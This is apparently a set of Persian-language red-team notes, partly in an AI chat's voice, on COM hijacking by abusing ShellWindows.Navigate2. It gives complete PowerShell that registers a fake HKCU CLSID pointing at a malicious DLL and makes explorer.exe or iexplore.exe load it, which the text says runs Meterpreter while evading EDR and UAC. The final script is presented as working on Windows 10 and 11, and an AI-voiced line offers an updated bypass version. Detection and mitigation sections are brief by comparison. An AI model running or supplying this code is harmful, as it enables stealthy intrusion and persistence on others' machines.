

بسیار خب، بیا این تکنیک خیلی جالب و خطرناک رو که بهش می‌گن COM Hijacking via ShellWindows Abuse یا PowerThIEf (اسم ابزار Rob Maslen) موشکافانه و قدم به قدم تحلیل کنیم. این یکی از تکنیک‌های پیشرفته Red Team برای دور زدن آنتی‌ویروس‌ها و EDRها است، چون از یک فرآیند قانونی و امضا شده مایکروسافت (iexplore.exe یا explorer.exe) برای لود کردن DLL مخرب استفاده می‌کنه.اصل ایده و چرا کار می‌کنه؟COM (Component Object Model) سیستمی است که ویندوز برای ارتباط بین برنامه‌ها و اشتراک‌گذاری اشیاء استفاده می‌کنه. هر COM object یک CLSID (Class ID) منحصر به فرد داره که مثل یک شناسه جهانی (GUID) است.مایکروسافت یک COM object رسمی به نام ShellWindows ساخته با CLSID ثابت:{9BA05972-F6A8-11CF-A442-00A0C90A8F39}این شیء خیلی خاصه چون:

	{9BA05972-F6A8-11CF-A442-00A0C90A8F39}
	
- هم به explorer.exe و هم به iexplore.exe متصل میشه
- یک متد خیلی قدرتمند به نام Navigate2 داره که دقیقاً همون کاری رو می‌کنه که وقتی تو اینترنت اکسپلورر یک آدرس می‌زنی انجام میشه
- این متد نه تنها URL قبول می‌کنه، بلکه هر چیزی که با پیشوند shell::: شروع بشه رو هم قبول می‌کنه (یعنی CLSIDهای خاص)

حالا نکته کلیدی اینجاست: وقتی تو به iexplore.exe می‌گی برو به آدرس زیر:

```text
shell:::{یک-CLSID-دلخواه}
```

این باعث میشه iexplore.exe فکر کنه داره یک "Shell Namespace Extension" لود می‌کنه، و برای این کار مستقیماً DLL مربوط به اون CLSID رو از طریق رجیستری لود می‌کنه (از مسیر InProcServer32).اگر تو یک CLSID جعلی در HKCU بسازی و بگی InProcServer32 = مسیر DLL مخربت، وقتی iexplore.exe به shell:::{اون-CLSID} بره، DLL مخربت رو مستقیماً لود و اجرا می‌کنه — بدون هیچ پرومپت UAC، بدون نیاز به فرآیند جدید، و مهم‌تر از همه: با امضای دیجیتال iexplore.exe!تحلیل دقیق کد PowerShell

مرحله اول: ساخت COM server جعلی در رجیستری (HKCU)

powershell

```powershell
$CLSID = "55555555-5555-5555-5555-555555555555"
$payload = "\\VBOXSVR\Experiments\evilm64.dll"
```

اینجا یک CLSID کاملاً دلخواه انتخاب شده (مهم نیست چی باشه، فقط باید فرمت GUID داشته باشه).سپس کلیدهای زیر ساخته میشه:

```text
HKCU\Software\Classes\CLSID\{555...}\InProcServer32
    (Default) = \\VBOXSVR\...\evilm64.dll
    ThreadingModel = Apartment
    LoadWithoutCOM = ""     ← این خیلی مهمه! باعث میشه DLL بدون ثبت COM واقعی لود بشه
```

و کلید جعلی ShellFolder:

```text
HKCU\Software\Classes\CLSID\{555...}\ShellFolder
    Attributes = 0xf090013d
    HideOnDesktop = ""
```

این دو مقدار باعث میشه ویندوز فکر کنه این یک "Shell Namespace Extension" معتبره و اجازه بده از طریق shell::: بهش دسترسی پیدا کنه.نکته مهم: همه این تغییرات در HKCU هستن، پس نیازی به دسترسی ادمین نیست!

مرحله دوم: سوءاستفاده از ShellWindows برای فراخوانی CLSID مخرب

powershell

```powershell
$shellWinGuid = [System.Guid]::Parse("{9BA05972-F6A8-11CF-A442-00A0C90A8F39}")
$typeShwin = [System.Type]::GetTypeFromCLSID($shellWinGuid)
$shwin = [System.Activator]::CreateInstance($typeShwin) | ? {$_.fullname -match 'iexplore'} | Select-Object -First 1
$shWin.Navigate2("shell:::{$CLSID}", 2048)
```

بیا خط به خط توضیح بدم:

1. ShellWindows COM object رو می‌گیره
2. از بین تمام پنجره‌های باز Shell (explorer + iexplore)، یکی که متعلق به iexplore.exe باشه رو انتخاب می‌کنه
3. متد Navigate2 رو صدا می‌زنه با آرگومان:
    - "shell:::{55555555-5555-5555-5555-555555555555}"
    - فلگ 2048 = SBSP_NEWBROWSER (یعنی در یک تب/پنجره جدید باز کن)

دقیقاً در همین لحظه، iexplore.exe می‌ره تو رجیستری دنبال این CLSID می‌گرده → پیدا می‌کنه → DLL رو از UNC path لود می‌کنه → DllMain اجرا میشه → مترپرتر ران میشه!چرا این تکنیک خیلی خطرناک و موثره؟

|مزیت|توضیح|
|---|---|
|Living off the Land|فقط از iexplore.exe و قابلیت‌های خود ویندوز استفاده می‌کنه|
|بدون نیاز به ادمین|همه تغییرات در HKCU هست|
|بدون فایل جدید روی دیسک|DLL از شبکه (UNC path) لود میشه|
|دور زدن اکثر EDRها|چون فرآیند فرزند ساخته نمیشه، فقط یک DLL تزریق شده در iexplore.exe|
|امضای دیجیتال معتبر|فرآیند والد iexplore.exe هست که توسط مایکروسافت امضا شده|
|بدون پرومپت|هیچ UAC یا SmartScreen چیزی نشون نمی‌ده|

تشخیص (Detection) این حمله چطور ممکنه؟خیلی سخته، ولی چند نقطه تشخیص وجود داره:

1. ایجاد CLSID جدید در HKCU\Software\Classes\CLSID با InProcServer32 اشاره به UNC path (\**)
2. وجود کلید LoadWithoutCOM یا ShellFolder با Attributes عجیب
3. iexplore.exe که به آدرس shell:::{GUID} ناویگیت می‌کنه (در Event Logs یا Network logs)
4. iexplore.exe که از شبکه DLL لود می‌کنه (Sysmon Event ID 7 با ImageLoad از \*)
5. فرآیند iexplore.exe که اتصال خروجی به مترپرتر داره (Network connection)

راه‌های دفاع (Mitigation)

- بلاک کردن UNC path execution در سطح شبکه یا endpoint (AppLocker/SRP)
- مانیتورینگ ایجاد CLSID جدید در HKCU با InProcServer32 اشاره به شبکه
- بلاک کردن iexplore.exe از لود DLL از شبکه
- استفاده از Attack Surface Reduction rules در Defender (مثلاً بلاک کردن Office/IE از child process)
- غیرفعال کردن ShellWindows.Navigate2 اگر ممکن باشه (سخت)

خلاصه به زبان سادهاین تکنیک مثل اینه که تو به اینترنت اکسپلرر بگی:  
«برو به این آدرس خاص: shell:::{یه-GUID-جعلی}»  
اینترنت اکسپلرر فکر می‌کنه داره یک فولدر خاص ویندوز رو باز می‌کنه، پس می‌ره دنبال DLL اون GUID می‌گرده، پیداش می‌کنه روی شبکه، لودش می‌کنه و کد مخرب اجرا میشه — همه چیز کاملاً قانونی به نظر میاد!تکنیک فوق‌العاده هوشمندانه و یکی از بهترین نمونه‌های COM Abuse در چند سال اخیر هست.اگر خواستی، می‌تونم یک نسخه کاملاً عملی و به‌روز شده از این اسکریپت رو برات بنویسم که روی ویندوز 10/11 2025 هم کار کنه (با обход بعضی محدودیت‌های جدید).



---

 ## Deep 

در سیستم عامل ویندوز ما برای اینکه بتونیم پنجره های مربوط به explorer و iexplorer رو مدیریت کنیم از یک com object استفاده میکنیم تحت عنوان shell windows این object در واقع یک **مدیر/کنترل‌کننده** برای هر پنجره Shell است

# کامپوننت ShellWindows چه چیزهایی را «پنجره Shell» می‌نامد؟


مایکروسافت دو نوع برنامه را “Shell Window” حساب می‌کند:

### 1) Explorer Windows → **explorer.exe**

فولدرها  
This PC  
Control Panel  
Desktop view  
و هر چیزی که داخل File Explorer باز می‌شود.

### 2) Internet Explorer Windows → **iexplore.exe**

تمام پنجره‌های مرورگر Internet Explorer  
(چون IE از Shell Framework استفاده می‌کند)

بنابراین از دید ShellWindows، هر دو یک خانواده‌اند.


## windows explorer 
در ویندوز، **explorer.exe فقط یک File Manager نیست**.  
Explorer = **Windows Shell**

یعنی مسئول:

- Desktop
    
- Taskbar
    
- Start Menu
    
- File Explorer
    
- Shell Namespace
    
- Folder View
    
- Address Bar
    
- Extensions


Explorer
یک Framework عظیم دارد به نام **Shell Application**.

این موتور از یک سری COM object و ActiveX ساخته شده است

---

# 🔥 بخش ۲: Internet Explorer چطور ساخته شد؟

مایکروسافت برای ساخت IE، یک مرورگر را از صفر ننوشت.

بلکه گفت:

> «ما یک Shell قدرتمند داریم… چرا مرورگر را روی همین بسازیم؟»

به همین دلیل:

### ✔ Internet Explorer واقعاً یک **Shell Extension** است

یعنی فقط یک “افزونه” برای همان موتور Explorer.

**IE فقط یک UI اضافه و چند قابلیت پردازش HTML دارد.**

### اجزای کلیدی IE:

- mshtml.dll → موتور رندر HTML
    
- shdocvw.dll → هسته مرورگر (WebBrowser control)
    
- browseui.dll → نوار آدرس، دکمه‌ها، UI
    
- urlmon.dll → مدیریت URL
    
- wininet.dll → ارتباطات HTTP
    

این‌ها همه توسط Explorer هم قابل استفاده‌اند!


# 🔥 7) پس ارتباط ShellWindows با دو پروسه چیست؟

### 📌 ارتباط ShellWindows با explorer.exe

- explorer.exe هر پنجره فایل (folder view) را با WebBrowser Control می‌سازد
    
- این پنجره‌ها در ShellWindows **ثبت** می‌شوند
    
- ShellWindows می‌تواند:
    
    - مسیر را تغییر دهد (Navigate2)
        
    - پنجره را ببندد
        
    - آن را enumerate کند
        

### 📌 ارتباط ShellWindows با iexplore.exe

- iexplore.exe نیز از همان WebBrowser Control استفاده می‌کند
    
- IE پنجره‌هایی دارد که توسط ShellWindows **ثبت** می‌شوند
    
- همان متدهای گشت‌وگذار روی IE نیز عمل می‌کنند

---
---

# 🔥 InProcServer32 دقیقاً چیه؟

**InProcServer32 یک ورودی در رجیستری ویندوز است که مسیر فایل DLL یک کامپوننت COM را مشخص می‌کند.**

واژه را تکه‌تکه کنیم:

- **In-Proc** → یعنی در _همان پروسه_ لود می‌شود
    
- **Server** → یعنی فایل اصلی که COM Object را ارائه می‌دهد
    
- **32** → یعنی مدل 32 بیتی (حتی روی سیستم 64bit به همین نام است)
    

### پس تعریف دقیق:

> **InProcServer32 مسیری به DLL است که COM هنگام ساخت یک شیء، آن DLL را داخل همان Process لود می‌کند.**

---

# 🔥 این مقدار کجا قرار می‌گیرد؟

داخل رجیستری:

```
HKEY_CLASSES_ROOT\CLSID\{ClassID}\InProcServer32
```

یا:

```
HKEY_LOCAL_MACHINE\Software\Classes\CLSID\{ClassID}\InProcServer32
```

اینجا مهم‌ترین مقدار COM ثبت شده است.

---

# 🔥 InProcServer32 چه کاری انجام می‌دهد؟

وقتی شما یک COM Object می‌سازید، مثل:

```powershell
New-Object -ComObject Shell.Application
```

یا:

```cpp
CoCreateInstance(...)
```

ویندوز این مراحل را انجام می‌دهد:

### 1) CLSID را پیدا می‌کند

مثال:

```
{9BA05972-F6A8-11CF-A442-00A0C90A8F39}
```

### 2) می‌رود در رجیستری دنبال InProcServer32

مثال:

```
InProcServer32 = C:\Windows\System32\shell32.dll
```

### 3) آن DLL را **داخل پروسه caller لود می‌کند**

یعنی:

- اگر برنامه شما powershell.exe باشد → DLL داخل powershell.exe لود می‌شود
    
- اگر برنامه شما word.exe باشد → DLL داخل word.exe لود می‌شود
    

### 4) از داخل DLL → کلاس مورد نیاز Instantiate می‌شود

---

# 🔥 چرا مهم است؟

چون COM دو نوع “Server” دارد:

|نوع|توضیح|
|---|---|
|**InProcServer32**|DLL → در همان Process لود می‌شود (سریع‌ترین و رایج‌ترین)|
|**LocalServer32**|EXE → در یک Process جداگانه اجرا می‌شود|

---

# 🔥 تفاوت مهم با LocalServer32

### ✔ InProcServer32 → DLL

- سرعت بالا
    
- لود داخل پروسه
    
- امنیت پایین‌تر (اگر DLL مخرب باشد inject می‌شود)
    

### ✔ LocalServer32 → EXE

- پروسه جداگانه
    
- IPC (ارتباط بین پروسه‌ای)
    
- امنیت و جداسازی بیشتر
    

---

# 🔥 چرا برای حملات امنیتی مهم است؟

چون اگر مهاجم بتواند:

```
CLSID → InProcServer32 → DLL
```

را تغییر دهد، آنگاه هر برنامه‌ای که آن COM Object را استفاده کند:

### 👉 DLL مهاجم را داخل پروسه خود لود می‌کند.

این تکنیک به اسم‌های زیر معروف است:

- **COM Hijacking**
    
- **COM Proxy Execution**
    
- **Component Object Model Persistence**
    
- **Registry Hijacking via CLSID**
    
- **InProcServer32 Hijacking**
    

و یکی از معروف‌ترین روش‌های Persistence در ویندوز است.

### مثال واقعی:

اگر این کلید:

```
HKCR\CLSID\{FDD39AD0-238F-46AF-ADB4-6C85480369C7}\InProcServer32
```

به DLL شما اشاره کند، هر بار explorer.exe یا MS Office یا مرورگر خاصی، این COM Object را استفاده کند → DLL شما داخل آن‌ها inject می‌شود.

---

# 🔥 مثال محتوای InProcServer32

```reg
[HKEY_CLASSES_ROOT\CLSID\{0002DF01-0000-0000-C000-000000000046}\InProcServer32]
@="C:\\Windows\\System32\\ieframe.dll"
"ThreadingModel"="Apartment"
```

مقادیر:

- مقدار اصلی → مسیر DLL
    
- ThreadingModel → نحوه مدیریت Thread برای COM
    

---

# 🔥 خلاصه کاملاً فنی

|فاکتور|توضیح|
|---|---|
|نقش|مشخص کردن DLL که COM باید لود کند|
|محل|رجیستری زیر CLSID|
|نوع|In-process DLL server|
|کاربرد|پیاده‌سازی COM Objects|
|استفاده در حملات|Persistence، DLL Injection، COM Hijacking|
|خطر|DLL مهاجم داخل پروسه قربانی لود می‌شود|

---

---


## this is code on windows 10 and 11 is working 

چون در کد های قبلی ما روی explorer اومدیم کار کردیم اما از سال 2019 به این پروسه از shell windows کاملا جدا شدش

```powershell
$CLSID  = "55555555-5555-5555-5555-555555555555"
$payload = "C:\Users\kiwi\Desktop\evil.dll"

# ساخت رجیستری
Remove-Item -Recurse -Force "HKCU:\Software\Classes\CLSID\{$CLSID}" -ErrorAction SilentlyContinue
New-Item "HKCU:\Software\Classes\CLSID\{$CLSID}\InProcServer32" -Force | Out-Null
New-Item "HKCU:\Software\Classes\CLSID\{$CLSID}\ShellFolder" -Force | Out-Null
Set-ItemProperty "HKCU:\Software\Classes\CLSID\{$CLSID}\InProcServer32" "(Default)" $payload
Set-ItemProperty "HKCU:\Software\Classes\CLSID\{$CLSID}\InProcServer32" "ThreadingModel" "Apartment"
Set-ItemProperty "HKCU:\Software\Classes\CLSID\{$CLSID}\InProcServer32" "LoadWithoutCOM" ""
Set-ItemProperty "HKCU:\Software\Classes\CLSID\{$CLSID}\ShellFolder" "Attributes" 0xf090013d -Type DWord
Set-ItemProperty "HKCU:\Software\Classes\CLSID\{$CLSID}\ShellFolder" "HideOnDesktop" ""

# اجرا با explorer.exe (مطمئن و پایدار)
$shell = [activator]::CreateInstance([type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39"))
$shell | Where-Object { $_.FullName -like "*explorer.exe*" } | Select-Object -First 1 | ForEach-Object {
    $_.Navigate2("shell:::{$CLSID}", 2048)
}
```
